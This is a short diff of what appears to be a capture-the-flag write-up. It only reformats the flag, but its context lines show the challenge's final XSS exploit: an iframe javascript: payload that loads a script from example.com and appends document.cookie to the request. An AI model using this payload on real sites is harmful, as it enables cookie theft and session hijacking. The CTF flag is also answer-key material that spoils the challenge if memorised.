@@ -32,4 +32,4 @@ Final Exploit:
 <iframe src="javascript:a=document.createElement('script'),a.setAttribute('src','https://example.com/x.js?cookie='+document.cookie),document.documentElement.appendChild(a)"></iframe>
 ```
 
-Flag: flag{wh0_n33d5_d0mpur1fy}
+Flag: `flag{wh0_n33d5_d0mpur1fy}`
